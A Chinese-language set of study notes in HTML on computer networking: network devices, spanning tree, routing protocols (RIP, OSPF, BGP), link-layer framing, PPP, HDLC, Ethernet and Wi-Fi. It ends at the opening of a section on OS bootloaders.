<p>编解码器（英语：codec）指的是一个能够对一个信号或者一个数据流进行编解码操作的设备或者程序。这里指的变换既包括将信号或者数据流进行编码（通常是为了传输、存储或者加密）或者提获取到一个编码流的操作，也包括为了观察或者处理从这个编码流中恢复适合观察或操作的形式的操作。编解码器经常用在视频会议和流媒体等应用中。一个编解码器不应该同编码或压缩格式或标准混淆，一种格式是一种文档（所谓标准），一种存储数据的方式，但是编解码器却是一段程序用于读或写这样的文件。实际上，有时编解码器不严谨地意指格式。</p>
<p>编解码器对应的英文“codec”（<strong>co</strong>mpress和<strong>dec</strong>ompress简化而成的合成词语）。</p>
<h2 id="中继器"><a class="header" href="#中继器">中继器</a></h2>
<p>中继器的主要功能是将信号整形并放大再转发出去，以消除信号经过长一段电缆之后产生的失真和衰减。中继器工作在<strong>物理层</strong>。</p>
<h2 id="集线器-hub"><a class="header" href="#集线器-hub">集线器 Hub</a></h2>
<p>集线器(Ethernet hub)是指将多条以太网双绞线或光纤集合连接在同一段物理介质下的设备。集线器是运作在OSI模型中的<strong>物理层</strong>，可以让其链接的设备工作在同一网段。集线器上有多个I/O端口，信号从任意一个端口进入后，会从所有其他端口出现。你可以认为他是<strong>多端口的中继器</strong>。</p>
<p>由于集线器会把收到的任何数字信号，经过再生或放大，再从集线器的所有端口提交，这会造成信号之间碰撞的机会很大，而且信号也可能被窃听，并且这代表所有连到集线器的设备，都是属于同一个<strong>碰撞域</strong>以及<strong>广播域</strong>，因此大部分集线器已被交换机取代。</p>
<p>工作在物理层，自然不会进行差错检测了。集线器很单纯的。</p>
<h2 id="网桥-bridge"><a class="header" href="#网桥-bridge">网桥 Bridge</a></h2>
<p>两个或多个以太网通过网桥连接之后，就会称为一个覆盖范围更大的以太网。原来的每个以太网被称为一个网段。网桥工作在<strong>链路层</strong>上，他处理的单位是帧。</p>
<p>如果网络1和网络2通过网桥连接，网桥接受到网络1发送的帧，检查帧中的地址，如果是网络2的地址就转发给网络2，如果是网络1的地址就将他丢弃。</p>
<p>网桥与集线器的无脑转发相比多了这么几个功能：</p>
<ol>
<li>识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的数据帧转发给相连的另一个网段。这也带来了延迟。</li>
<li>网桥可以通过检查FCS来进行差错控制，并且在发送数据帧可以进行冲突检测。</li>
<li>网桥有MAC地址表，这使得网桥在转发数据时不会将每个数据帧都泛洪至其他所有接口。而是选择正确的端口。</li>
</ol>
<h2 id="二层交换机-switch"><a class="header" href="#二层交换机-switch">(二层)交换机 Switch</a></h2>
<p>交换机可以看做是多端口的网桥。</p>
<p>当交换机收到数据时，它会检查它的目的MAC地址，然后把数据从目的主机所在的接口转发出去。交换机之所以能实现这一功能，是因为交换机内部有一个MAC地址表，MAC地址表记录了网络中所有MAC地址与该交换机各端口的对应信息。某一数据帧需要转发时，交换机根据该数据帧的目的MAC地址来查找MAC地址表，从而得到该地址对应的端口，即知道具有该MAC地址的设备是连接在交换机的哪个端口上，然后交换机把数据帧从该端口转发出去。</p>
<p><strong>二层交换机</strong>属<strong>数据链路层</strong>设备，可以识别数据包中的<strong>MAC地址</strong>信息，根据MAC地址进行转发，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。</p>
<blockquote>
<p>回顾一下，链路层的地址是MAC Address，网络层的地址是IP Address。我们在网络层进行端到端的通信是IP-&gt;IP，链路层不知道什么IP，只知道MAC。我们的ARP协议就是根据IP获得MAC的协议，所以ARP协议在局域网非常重要。另外，<code>ff:ff:ff:ff:ff:ff</code>这个MAC地址是专门用来广播的。</p>
</blockquote>
<p><strong>二层交换机具体的工作流程如下：</strong></p>
<ol>
<li>当交换机从某个端口收到一个数据包，它先读取包头中的源MAC地址，这样它就知道源MAC地址的机器是连在哪个端口上的。</li>
<li>再去读取包头中的目的MAC地址，并在地址表中查找相应的端口。</li>
<li>如表中有与这目的MAC地址对应的端口，把数据包直接复制到这端口上。</li>
<li>如表中找不到相应的端口，则把数据包<strong>广播</strong>到所有端口上，当目的机器对源机器回应时，交换机又可以学习一目的MAC地址与哪个端口对应，在下次传送数据时就不再需要对所有端口进行广播了。</li>
</ol>
<p>如果有很多设备连接在一个<strong>广播域</strong>下，那么如果一个设备发出广播，广播数据充斥网络无法处理，并占用大量网络带宽，导致正常业务不能运行，甚至彻底瘫痪，这就发生了<strong>广播风暴(broadcast storm)</strong>。所以二层交换机提供了分割<strong>虚拟局域网VLAN</strong>的功能，VLAN内的主机间可以直接通信，而<strong>VLAN间不能直接通信</strong>，从而将广播报文限制在一个VLAN内。</p>
<p>二层交换机只能隔离了冲突域，没有隔离广播域。想要隔离广播域可以使用VLAN功能。</p>
<h3 id="spanning-tree-protocol"><a class="header" href="#spanning-tree-protocol">Spanning Tree Protocol</a></h3>
<p>当交换机包括一个冗余回路时，以太网交换机通过<strong>生成树协议</strong>避免回路的产生，同时允许存在后备路径。</p>
<p>STP生成树算法的三个步骤：</p>
<ol>
<li>
<p>每个广播域选择根网桥（Root Bridge）</p>
<p>网桥ID（BID）：网桥ID是唯一的，交换机BID值最小的交换机作为网络中的<strong>根网桥</strong>。根据网桥ID选择网桥，环路拓扑中，所有网桥接口默认都在VLAN1里。</p>
<p>BID = 网桥优先级 || MAC地址。换句话说，先选优先级，优先级一样选MAC地址小的。</p>
</li>
<li>
<p>每个非根网桥选择根端口（Root Ports）选择根端口的依据：</p>
<ol>
<li>到根网桥最低的根路径成本：网桥到根网桥的路径上所有链路的成本之和。如果成本一样就看哪个端口和根直连，选离根更近的端口也就是选直连的那个端口。</li>
<li>直连的网桥ID最小</li>
<li>端口ID最小</li>
</ol>
</li>
<li>
<p>每个网段上选择指定端口（Designated Ports）。指定端口选出来了，剩下的端口都阻塞了。</p>
<p>根网桥上的端口全是指定端口。在每个网段上，选择一个指定端口（DP）。非根桥上的指定端口，选择顺序：</p>
<ol>
<li>根路径成本较低（对比端口到根路径的成本）</li>
<li>所在的交换机的网桥ID的值最小</li>
<li>端口ID的值较小</li>
</ol>
</li>
</ol>
<h3 id="vlan和trunk"><a class="header" href="#vlan和trunk">VLAN和Trunk</a></h3>
<h2 id="三层交换机-three-layer-switch"><a class="header" href="#三层交换机-three-layer-switch">三层交换机 Three Layer Switch</a></h2>
<p><strong>三层交换机</strong>的第三层工作在网络层。三层交换技术就是将路由技术与交换技术合二为一的技术。在对第一个数据流进行路由后，它将会产生一个<strong>MAC地址与IP地址的映射表</strong>，当同样的数据流再次通过时，将<strong>根据此表直接从二层通过而不是再次路由</strong>，从而消除了路由器进行路由选择而造成网络的延迟，提高了数据包转发的效率。</p>
<p>所以通过三层交换机，我们支持不同VLAN设备的通信。</p>
<h2 id="路由器-router"><a class="header" href="#路由器-router">路由器 Router</a></h2>
<p>路由器(Router)是一种电讯网络设备，提供<strong>路由</strong>与<strong>转送</strong>两种重要机制，可以决定数据包从来源端到目的端所经过的路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议（IP）。</p>
<blockquote>
<p>当我们PING一个目标地址<code>dst=x.x.x.x</code>的时候，发生了什么？</p>
<ol>
<li>记子网掩码为<code>mask</code>，本机IP地址为<code>src=y.y.y.y</code>，默认网关为<code>gate = z.z.z.z</code>.
<ol>
<li><code>if mask&amp;dst == mask&amp;src</code> 说明本机和目标处在同一个子网。我们的数据直接发送给目标机器。</li>
<li><code>if mask&amp;dst != mask&amp;src</code> 说明本机和目标不在同一个子网。我们的数据被转交给了默认网关。</li>
</ol>
</li>
</ol>
</blockquote>
<p>需要注意的是，我们家中用的路由器其实集合了集线器和交换机的功能，不是单纯的路由器。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="路由协议"><a class="header" href="#路由协议">路由协议</a></h1>
<!-- toc -->
<p>我们知道，路由器最重要的功能就是转发和路由。可以把路由器想象成内部有两个进程。其中一个进程在每个数据包到达的时候对它进行处理，它在<strong>路由表</strong>中查找该数据包所对应的出境线路。这个进程即为<strong>转发</strong>（forwarding )进程：另一个进程负责生成和更新路由表，这正是<strong>路由</strong>(routing)算法发挥作用的地方。</p>
<h2 id="转发"><a class="header" href="#转发">转发</a></h2>
<p>首先了解一下路由器是如何转发分组的。下面是电脑路由表示例，整个路由表很大，我只取了前面的一小部分。</p>
<pre><code>IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.162.0.1    10.162.54.218     40
       10.162.0.0      255.255.0.0         On-link     10.162.54.218    296
    10.162.54.218  255.255.255.255         On-link     10.162.54.218    296
   10.162.255.255  255.255.255.255         On-link     10.162.54.218    296
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
===========================================================================
</code></pre>
<p>我们通过<strong>Longest Prefix Match</strong>算法来进行转发目的的选择。假设现在我有一个包的目的地址为<code>127.0.0.2</code>，</p>
<ol>
<li>根据<code>dst &amp; Netmask == Network</code>进行匹配的筛选。发现<code>Network=0.0.0.0</code>和<code>Network=127.0.0.0</code>都是匹配的。</li>
<li>那么我们需要选择哪个作为转发的目的呢？我们选择子网掩码最长的一个进行匹配，也就是<code>127.0.0.0</code>。</li>
<li>然后我们只需要把数据转发到<code>Interface==127.0.0.1</code>端口即可。<code>Gateway==On-link</code>，ARP协议把IP地址转成MAC地址，直接就到了。（当然<code>127.0.0.2</code>好像这一步也不需要，应该就直接到了）（如果匹配到了<code>0.0.0.0</code>，是ARP把<code>10.162.0.1</code>转成MAC地址转发过去，后续的事情就交给10.162.0.1指定的路由器了）</li>
</ol>
<h2 id="静态路由"><a class="header" href="#静态路由">静态路由</a></h2>
<p>预先计算好（手动配置好）路由信息，在网络启动时下载到路由器中。适合于网络结构非常清楚的场合变化不大的场合。</p>
<h2 id="动态路由"><a class="header" href="#动态路由">动态路由</a></h2>
<p>在目前的互联网中，路由选择协议可以分成两大类，分别是：</p>
<ol>
<li>内部网关协议IGP。指的是在一个内部自制系统(AS)中使用的路由选择协议，常用的有RIP和OSPF。</li>
<li>外部网关协议EGP。用来连接不同的自治系统。比如目前使用的BGP-4。</li>
</ol>
<p><img src="Basic/Networking/../images/image-20211103201143252.png" alt="image-20211103201143252" /></p>
<h3 id="flooding"><a class="header" href="#flooding">Flooding</a></h3>
<p>泛洪算法，这种技术将每一个入境包发送到除了该数据包到达的那条线路意外的每条出境线路（有点像集线器）。</p>
<p>抑制数据包泛滥的一个方法是计数（类似于TTL），当计数器达到0的话就丢弃数据包。</p>
<p>抑制数据包泛滥的一种更好技术是让路由器跟踪己经泛洪过的数据包，从而避免第二次发送它们。比如让路由器为每个端口设置一张表，记录已经收到的来自端口连接的路由器的包序号，如果入境数据包在这张表中，就不能再被泛洪到其他路由器。</p>
<p>虽然这种方法的效率很低，但是适合于广播，鲁棒性也很好。</p>
<h3 id="distance-vector-routing---rip"><a class="header" href="#distance-vector-routing---rip">Distance Vector Routing - RIP</a></h3>
<p><strong>距离矢量路由（distance vector routing ）算法是这样工作的：每个路由器维护一张表（即一个矢量〉，表中列出了当前己知的到每个目标的最佳距离，以及所使用的链路。这些表通过邻居之间相互交换信息而不断被更新，最终每个路由器都了解到达每个目的地的最佳链路。</strong></p>
<p>这种算法有一个特点，“好消息穿得很快，坏消息传的很慢”。左图为好消息，A一开始停机初始化之后开机。右图为坏消息，A一开始正常初始化之后关机，然后就陷入了<strong>无穷计数问题</strong>。 假设每条线的distance=1。</p>
<p><img src="Basic/Networking/../images/image-20211102101929804.png" alt="image-20211102101929804" /></p>
<p>已经有许多试图解决该问题的工作，例如，防止路由器向邻居返回一个从该邻居获得的最佳路径，这个方法称为带有染毒逆向的<strong>水平分裂法</strong>。问题的核心在于当X告诉Y它有一条通往某个地方的路径，Y无从知道自己是否己在这条路径上。</p>
<p>路由信息协议RIP（Routing Information Protocol）是基于距离矢量算法的路由协议，<u>利用跳数来作为计量标准</u>。在带宽、配置和管理方面要求较低，主要适合于规模较小的网络中。</p>
<p>RIP 允许一条路径最多只能包含 15 个路由器。因此“距离”等于16时即相当于不可达。可见 RIP 只适用于小型互联网。</p>
<h3 id="link-state-routing---ospf"><a class="header" href="#link-state-routing---ospf">Link State Routing - <a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E5%BC%8F%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E4%BC%98%E5%85%88">OSPF</a></a></h3>
<p>链路状态路由算法的设计思想非常简单，可以用五个部分加以描述。每一个路由器必须完成以下的事情，算法才能正常工作：</p>
<ol>
<li>发现它的邻居节点，并了解其网络地址。</li>
<li>设置到<strong>每个邻居节点的距离或者成本度量值</strong>。</li>
<li>构造一个包含所有刚刚获知的链路信息包。</li>
<li>将这个包<strong>发送给所有其他的路由器</strong>，并接收来自所有其他路由器的信息包。</li>
<li>计算出到每个其他路由器的最短路径。</li>
</ol>
<p>实际上，算法将<strong>完整的拓扑结构分发给了每一个路由器</strong>。然后每个路由器运行Dijkstra算法就可以找出从本地到每一个其他路由器的最短路径。</p>
<p>OSPF采用Dijkstra算法来计算最短路径树。它使用Cost作为路由度量。链路状态数据库	（LSDB）用来保存当前网络拓扑结构，路由器上属于同一区域的链路状态数据库是相同的（属于多个区域的路由器会为每个区域维护一份链路状态数据库）。</p>
<p>OSPF提出了“区域（Area）”的概念，一个网络可以由单一区域或者多个区域组成。其中，一个特别的区域被称为<strong>骨干区域（Backbone Area）</strong>，该区域是整个OSPF网络的核心区域，并且所有其他的区域都与之<strong>直接连接</strong>。所有的内部路由都通过骨干区域传递到其他非骨干区域。所有的区域都必须直接连接到骨干区域，如果不能创建直接连接，那么可以通过**虚链路（virtual link）**和骨干区域创建虚拟连接。</p>
<p><strong>OSPF定义了以下4种路由器类型：</strong></p>
<p>每一台OSPF路由器都有一个路由器标识符（Identifier），一般写作路由器ID。路由器ID由一个长度为32 bits的字段所定义，通常用IPv4地址格式来表示。如果没有显式的设置路由器ID，则该路由器上最大的活跃逻辑接口IP地址将成为路由器ID；如果路由器不存在逻辑接口，则最大的活跃物理接口IP地址将成为路由器ID。注意，不要将路由器类型和指定路由器（Designated Router，DR）、备份指定路由器（Backup Designated Router，BDR）混淆，DR和BDR是路由器接口属性，而不是整个路由器的属性。</p>
<ul>
<li>内部路由器（Internal Router）：如果一台路由器上所有启用了OSPF的接口都在同一区域，那么这台路由器就是内部路由器。</li>
<li>骨干路由器（Backbone Router）：骨干路由器是指至少有一个启用了OSPF的接口是和骨干区域（Area 0）相连的路由器。一台骨干路由器也可以同时是ABR或ASBR，如上图中的R2和R3。</li>
<li>区域边界路由器（Area Border Router，ABR）：区域边界路由器是指连接一个或者多个区域的路由器。区域边界路由器为每一个与之相连的区域维护一份链路状态数据库，因此区域边界路由器需要比内部路由器更多的内存资源和更高性能的处理器。</li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%87%AA%E6%B2%BB%E7%B3%BB%E7%BB%9F">自治系统</a>边界路由器（Autonomous System Boundary Router，ASBR）：自治系统边界路由器（ASBR）用来把从其他路由协议（如BGP、EIGRP、其他进程号的OSPF等）学习到的路由以路由重分发的方式注入到OSPF进程中，从而使得整个OSPF域内的路由器都可以学习到这些路由（除了末梢区域内的路由器）。一台ASBR可以是OSPF域内非末梢区域的任何路由器，它可以是内部路由器、区域边界路由器、骨干路由器。</li>
</ul>
<p><strong>OSPF定义了4种网络类型</strong></p>
<ul>
<li>点到点网络（point-to-point）：单独连接一对路由器的网络</li>
<li>广播网络（broadcast）：广播网络即可以同时连接多于两台设备的网络，如以太网、令牌环网、FDDI，广播网络上的路由器发送的组播/广播数据包会被其他与之相连的路由器收到。在广播网络上的OSPF路由器会选举一台<strong>指定路由器（DR）<strong>和一台</strong>备份指定路由器（BDR）</strong>，DR和BDR是路由器接口属性，而不是整个路由器的属性。</li>
<li>非广播多路访问网络（non-broadcast multi-access，NBMA）：可以同时连接两台以上的路由器，但是这种网络没有广播数据包的能力。在NBMA网络上需要选举DR和BDR，并且所有的OSPF数据包都是单播发送的。</li>
<li>点到多点网络（Point-to-MultiPoint）</li>
</ul>
<p>此外还有一种特殊的网络类型，称之Loopback类型。OSPF路由器上的<strong>Loopback接口</strong>在默认状态下均为此类型，不能人工设置一个接口的网络类型为Loopback。Loopback接口是逻辑的接口,即虚拟的软件接口，它们并不是真正的路由器接口。在OSPF路由协议中配置使用回环接口是为了确保在OSPF进程中总有一个激活的接口，回环接口可以用于OSPF的配置和诊断。</p>
<p><strong>一般来说，创建OSPF完全邻接时会经过以下状态：</strong></p>
<ol>
<li>失效状态（Down）：这是邻居会话的初始状态，表示最近没有从邻居收到信息。在NBMA网络上，可能仍然会以较低频率向处于Down状态的邻居发送Hello数据包。</li>
<li>尝试状态（Attempt）：该状态仅仅适用于连接在NBMA网络上的邻居。该状态表示最近没有从邻居收到信息，但仍需要作进一步的尝试，来联系邻居。这时按某一特定间隔向邻居发送Hello数据包。</li>
<li>初始状态（Init）:在此状态下，表示最近收到了从邻居发来的Hello数据包。但是，仍然没有和邻居创建双向通信（Bidirectional Communication），例如，路由器自身并没有出现在邻居发送的Hello数据包中。</li>
<li>双向通信状态（2-Way）：此状态意味着两台路由器之间创建了双向通信。在此状态下还将进行DR和BDR的选举（只有处于2-Way状态的路由器才有资格参选DR和BDR，路由器只与DR和BDR创建完全邻居关系，其他路由器之间的邻居状态停留在2-Way状态。）</li>
<li>信息交换初始状态（ExStart）：这个状态是创建邻接关系的第一步。该状态的目标是决定信息交换时路由器的主从关系，并确定初始数据库描述（DD）数据包的序列号。具有最高路由器ID的路由器将成为主路由器。</li>
<li>信息交换状态（ExChange）：在此状态的路由器通过向邻居发送DD数据包来描述其完整的链路状态数据库。每一个DD数据包都有一个序列号，并且需要被显式的确认。在任何时候，每次只能发送一个DD数据包。在此状态下，路由器也可以发送链路状态请求数据包，用来向邻居请求最新的LSA。实际上，这些状态的邻接关系完全有能力发送和接收所有类型的OSPF协议数据包。</li>
<li>信息加载状态（Loading）：在此状态下，路由器将会向邻居路由器发送链路状态请求数据包，用来请求信息交换状态发现的最新的LSA。</li>
<li>完全邻接状态（Full）：在此状态下，邻居路由器形成完全邻接关系。这些邻接关系将会在路由器LSA和网络LSA中被描述。</li>
</ol>
<p>为了让OSPF能用于规模很大的网络，OSPF将AS划分成若干个更小的范围，叫做Area。泛洪交换被局限于每个Area内。</p>
<p><img src="Basic/Networking/../images/image-20211103202439638.png" alt="image-20211103202439638" /></p>
<h3 id="bgp"><a class="header" href="#bgp">BGP</a></h3>
<p>边界网关协议（英语：Border Gateway Protocol，缩写：BGP）是互联网上一个核心的去中心化自治路由协议。它通过维护IP路由表或“前缀”表来实现**自治系统（AS）**之间的可达性，属于矢量路由协议。BGP不使用传统的内部网关协议（IGP）的指标，而使用基于路径、网络策略或规则集来决定路由。</p>
<p>一个自治系统内部使用的路由协议称为内部网管协议IGP，比如RIP和OSPF；自治系统之间使用的路由协议称为外部网关协议EGP，比如BGP。</p>
<p>BGP用于在不同的自治系统（AS）之间交换路由信息。当两个AS需要交换路由信息时，每个AS都必须指定一个运行BGP的节点，来代表AS与其他的AS交换路由信息。这个节点可以是一个主机。但通常是路由器来执行BGP。两个AS中<strong>利用BGP交换信息的路由器也被称为边界网关（Border Gateway）或边界路由器（Border Router）</strong>。</p>
<p>每个AS至少要选择一个路由器作为AS的 <strong>BGP speaker</strong> 。</p>
<h3 id="层次路由"><a class="header" href="#层次路由">层次路由</a></h3>
<p>随着网络规模的增长，路由表也成比例的增长。当网络增长到一定程度，每个路由器不可能再为其他每一个路由器维护一个表项。路由分层次进行。</p>
<h3 id="广播和组播"><a class="header" href="#广播和组播">广播和组播</a></h3>
<div style="break-before: page; page-break-before: always;"></div><h1 id="链路层"><a class="header" href="#链路层">链路层</a></h1>
<!-- toc -->
<h2 id="数据链路层的功能"><a class="header" href="#数据链路层的功能">数据链路层的功能</a></h2>
<p>链路层功能概述:</p>
<ol>
<li>为网络层提供服务：分为无确认无连接服务（比如以太网），有确认无连接服务（无线通信常用），有确认面相连接服务。</li>
<li>链路管理：对于面向连接的服务，需要管理连接的建立、维持、释放；在多个站点共享同一物理信道的情况下，如何在要求通信的站点间<strong>分配和管理信道</strong>也是链路管理的范畴。</li>
<li>组帧(Framing)：两个主机传送消息的时候是把网络层的分组<strong>封装成帧</strong>，以帧的格式进行传输的。那么如何封装，如何定界就是问题了。</li>
<li>流量控制：由于收发双方的工作速率和缓存空间的差异，可能出现发送方的发送能力大于接收方的接收能力的情况。这个时候我们要限制发送方的发送速率，否则前面来不及接收的帧会被后面不断发送的帧淹没。详见<a href="Basic/Networking/./%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%92%8C%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6.html">拥塞控制和流量控制综述</a>这篇文章。</li>
<li>差错纠正和检测，链路层的检测主要是为了提高上层的传输效率，详见<a href="Basic/Networking/./%E5%B7%AE%E9%94%99%E6%8E%A7%E5%88%B6%E7%BB%BC%E8%BF%B0.html">差错控制综述</a>这篇文章。</li>
</ol>
<p>下面我们来详细解释。</p>
<h2 id="组装成帧-framing"><a class="header" href="#组装成帧-framing">组装成帧 Framing</a></h2>
<p><strong>帧frame</strong>: 链路层的<strong>协议数据单元(Protocol Data Unit,PDU)</strong>。（网络层的协议数据单元叫分组Packet，传输层的协议数据单元叫Message，TCP的协议数据单元叫Segment）</p>
<p>链路层的传输数据块叫做frame。是对IP分组的简单包装。 在**IP数据报(分组)**的前后添加一些字段，帧首部和帧尾部。首部和尾部包含许多的控制信息，还可以做到定界的作用。好的设计方案必须使接收方很容易发现一个新帧的开始，使用的信道带宽要少。元信息中还可能包括校验信息。我们要解决的主要问题是帧定界，帧同步，透明传输。</p>
<p><img src="Basic/Networking/../images/1615118128709.jpg" alt="" /></p>
<p>通常有下面四种方法实现组帧，一般使用后面两种。</p>
<ol>
<li>字节计数法．</li>
<li>字节填充的标志字节法（如PPP协议使用的）</li>
<li>比特填充的标志比特法。</li>
<li>物理层编码违禁法。</li>
</ol>
<h3 id="字节计数法"><a class="header" href="#字节计数法">字节计数法</a></h3>
<p>字节计数法是在帧的头部使用一个计数字段来标明帧内字符数。目的节点收到字节计数值之后就知道后面跟着的字节数，就可以确定帧的结束位置。这个的最大问题是一旦字节计数值出错，就无法判断这个帧的结束和下个帧的开始，收发双方失去同步。</p>
<h3 id="字节填充的标志字节法"><a class="header" href="#字节填充的标志字节法">字节填充的标志字节法</a></h3>
<p>使用特定字符来定界一帧的开始和结束。</p>
<p>有一个可能的问题，就是传输的数据中出现了控制字符（如下图所示, SOH, EOT）。所以我们要防止这种情况的发生。也就是说，无论数据是什么都应该能正常的传输, 就好像数据是透明的一样。这就是<strong>透明传输</strong>。在字节填充法中，我们用转义符的方式实现（就好像字符串中有出现<code>“</code>，要用<code>\&quot;</code>一样）</p>
<p><img src="Basic/Networking/../images/1615118868520.jpg" alt="" /></p>
<h3 id="零比特填充法"><a class="header" href="#零比特填充法">零比特填充法</a></h3>
<p>也是使用特定字符来定界一帧的开始和结束。</p>
<p>（ 5&quot;1&quot;1&quot;0&quot;法）：比如开始和结束的标志是01111110。对应的透明传输方案是，我们在对数据进行封装的时候，遇到连续的5个1就填充一个0，解封装的时候遇到连续的5个1就删除后面的0。在遇到连续的六个1，我们就知道到达了边界了，这种方法很适合用硬件来实现。</p>
<h3 id="违规编码法"><a class="header" href="#违规编码法">违规编码法</a></h3>
<p>比如曼彻斯特编码只有 “高低”和“低高”，所以我们就可以用“高高”和“低低”作为控制字符。IEEE802标准采用这种办法。	</p>
<h2 id="传输数据使用的两种链路"><a class="header" href="#传输数据使用的两种链路">传输数据使用的两种链路</a></h2>
<p>分为<strong>点对点链路</strong>（如PPP协议，常用于广域网）和<strong>广播式链路</strong>（常用于局域网）。一般来说，广域网工作在三层（物理层，链路层，网络层）上，局域网工作在两层（物理层，链路层）上。</p>
<h3 id="ppp"><a class="header" href="#ppp">PPP</a></h3>
<p>PPP是点对点链路的一种协议。常用于广域网做数据链路层控制协议。</p>
<p>PPP协议有三个部分组成：</p>
<ul>
<li>链路控制协议LCP。用于建立，配置，测试和管理数据链路。</li>
<li>网络控制协议NCP。PPP协议允许采用多种网络层协议，每个不同的网络层协议要用一个相应的NCP来配置，为网络层协议建立和配置逻辑链接。</li>
<li>将IP数据报封装到串行链路的方法。</li>
</ul>
<p>PPP帧格式，字节填充。</p>
<p><img src="Basic/Networking/../images/image-20211009111114865.png" alt="PPP帧格式" /></p>
<ul>
<li>第一个F(lag)作为控制字符，如果在信息部分出现是要用<code>7D</code>转义的。</li>
<li>A(dress)和C(ontrol)就是<code>FF</code>和<code>03</code>，不会是别的值。他们是可以通过协商<strong>省略</strong>的。</li>
<li>第四个字段是2字节的协议字段。当协议字段为 0x0021时，PPP 帧的信息字段就是 IP 数据报。若为 0xC021，则信息字段是 PPP 链路控制协议 LCP 的数据，而0x8021表示这是网络层的控制数据。</li>
<li>尾部的FCS是校验码。</li>
<li>最后的F(lag)表示帧结束。</li>
</ul>
<h3 id="hdlc协议"><a class="header" href="#hdlc协议">HDLC协议</a></h3>
<p>High-level Data Link Control也是用于广域网的点对点链路层传输控制协议。</p>
<p><img src="Basic/Networking/../images/image-20211215000813913.png" alt="HDLC的帧格式" /></p>
<ul>
<li>F(lag)为<code>01111110</code>，作为控制字段。中间的bit stream如果出现了连续的5个1就会插入0，就是上面讲的零比特填充法。</li>
<li>A(ddress) ：</li>
<li>C(ontrol) ：</li>
<li>FCS: 校验码。</li>
</ul>
<p>相比于PPP：</p>
<ul>
<li>他是面向bit的，采用0比特插入法实现的透明传输。</li>
<li>PPP只有差错检验，而HDLC采用了编号和确认机制，能够提供<strong>可靠传输</strong>。</li>
</ul>
<h3 id="ethernet-ieee-8023"><a class="header" href="#ethernet-ieee-8023">Ethernet IEEE 802.3</a></h3>
<p>严格来讲以太网和IEEE 802.3不是完全一样的，但是差异非常小。我们可以当做是一个东西。</p>
<p>以太网的标准拓扑结构为总线型拓扑，但目前的快速以太网（100BASE-T、1000BASE-T标准）为了减少冲突，将能提高的网络速度和使用效率最大化，使用交换机（Switch hub）来进行网络连接和组织。如此一来，以太网的拓扑结构就成了星型；但在逻辑上，以太网仍然使用总线型拓扑和CSMA/CD（Carrier Sense Multiple Access/Collision Detection，即载波多重访问/碰撞侦测）的总线技术。</p>
<center>
    早期以太网结构，拓扑结构为总线型
</center>
<p><img src="Basic/Networking/../images/webp.webp" alt="早期以太网结构" /></p>
<center>
通过集线器，逻辑拓扑仍然为总线型，物理拓扑为星形，更加可靠
</center>
<img src="Basic/Networking/../images/image-20211025191134917.png" alt="image-20211025191134917" style="zoom:50%;" />
<p>以太网的数据帧格式如下。目的地址和源地址是6 byte的MAC地址，数据是46~1500byte的IP数据报，因为<strong>CSMA/CD</strong>规定以太网的最短帧长为64 bytes（所以如果数据小于46 bits，需要填充）。FCS是校验码。类型字段在IEEE中为长度字段。</p>
<p><img src="Basic/Networking/../images/image-20211214234358559.png" alt="image-20211214234358559" /></p>
<p>以太网有两类：第一类是经典以太网（ classic Ehemet ），上面介绍的CSMA/CD就用在经典以太网。第二类是交换式以太网（ switched Ethernet ），使用了一种称为<strong>交换机</strong>的设备连接不同的计算机。交换式以太网正是成就了以太网的以太网，可运行在 100 1000 10000 Mbps 那样的高速率，分别以快速以太网、千兆以太网和万兆以太网的形式呈现。实际上，现在使用的只有<strong>交换式以太网</strong>。</p>
<h3 id="wi-fi-80211"><a class="header" href="#wi-fi-80211">Wi-Fi 802.11</a></h3>
<p>Wi-Fi与IEEE 802.11常常被混淆，两者的区别可以概述为IEEE 802.11是一种无线局域网标准，而Wi-Fi是IEEE 802.11标准的一种实现。802.11采用星型拓扑，其中心被称为接入点(Access Point)。</p>
<p><strong>CSMA/CA协议</strong>主要使用两种方法来避免碰撞，详细的参考<a href="Basic/Networking/./%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82.html">介质访问子层</a>。</p>
<ol>
<li>设备欲发送帧（Frame），且帧听到通道空闲时，维持一段帧间隔时间后，再等待一段随机的时间依然空闲时，才提交资料。由于各个设备的等待时间是分别随机产生的，因此很大可能有所区别，由此可以减少碰撞的可能性。</li>
<li>RTS-CTS三向握手（英语：handshake）：设备欲发送帧前，先发送一个很小的RTS（Request to Send）帧给最近的接入点（Access Point），等待目标端回应CTS（Clear to Send）帧后，才开始发送。此方式可以确保接下来发送资料时，不会发生碰撞。同时由于RTS帧与CTS帧都很小，让发送的无效开销变小。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os"><a class="header" href="#os">OS</a></h1>
<p>这里的东西都非常的naive啊。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-bootloader"><a class="header" href="#os-bootloader">OS-Bootloader</a></h1>
<p>参考链接：https://www.ionos.com/digitalguide/server/configuration/what-is-a-bootloader/
当我们需要运行程序的时候，我们需要把他载入内存（main memory）。
而操作系统是最重要的程序，我们需要在设备启动的时候就将操作系统载入main memory。这就是bootloader要做的事。</p>
<h2 id="什么是bootloader"><a class="header" href="#什么是bootloader">什么是bootloader</a></h2>
<p>A bootloader, also known as a boot program or bootstrap loader, is a special <strong>operating system software</strong> that loads into the working memory of a computer after start-up.
Immediately after a device starts, a bootloader is generally launched by a bootable medium。The boot medium(介质) receives information from the computer’s firmware (固件，e.g. BIOS) about where the bootloader is.</p>
<h2 id="计算机是如何启动的"><a class="header" href="#计算机是如何启动的">计算机是如何启动的</a></h2>
<ol>
